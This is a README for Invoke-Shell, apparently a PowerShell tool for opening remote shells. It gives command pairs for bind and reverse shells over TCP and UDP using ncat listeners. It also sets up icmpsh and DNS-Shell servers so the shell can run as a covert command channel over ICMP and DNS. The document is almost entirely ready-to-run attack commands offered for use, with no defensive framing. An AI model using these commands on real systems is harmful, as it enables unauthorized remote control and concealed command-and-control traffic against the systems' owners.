# Invoke-Shell

A sort of simple shell which support multiple protocols. 

## TCP

**For bind shell**

```
Invoke-Shell -command "tcp listen 0.0.0.0 8080"
```

```
ncat -v 1.1.1.1 8080
```

**For reverse shell**

```
ncat -lvp 8080
```

```
Invoke-Shell -command "tcp connect 1.1.1.1 8080"
```

## UDP

**For bind shell**

```
Invoke-Shell -command "udp listen 0.0.0.0 8080"
```

```
ncat -u -v 1.1.1.1 8080
```

**For reverse shell**

```
ncat -u -lvp 8080
```

When  reverse connection accepted, type enter to make prompt display.

```
Invoke-Shell -command "udp connect 1.1.1.1 8080"
```

## ICMP

```
git clone https://github.com/inquisb/icmpsh
sysctl -w net.ipv4.icmp_echo_ignore_all=1
cd icmpsh && python icmpsh-m.py listenIP reverseConnectIP
```

```
Invoke-Shell -command "icmp connect listenIP"
```

## DNS

```
pip install dnslib
git clone https://github.com/sensepost/DNS-Shell
```

**For direct mode**

```
python DNS-Shell.py -l -d [Server IP]
Invoke-Shell -command "dns direct ServerIP Domain" 
```

**For recursive mode**

```
DNS-Shell.py -l -r [Domain]
Invoke-Shell -command "dns recurse Domain"
```
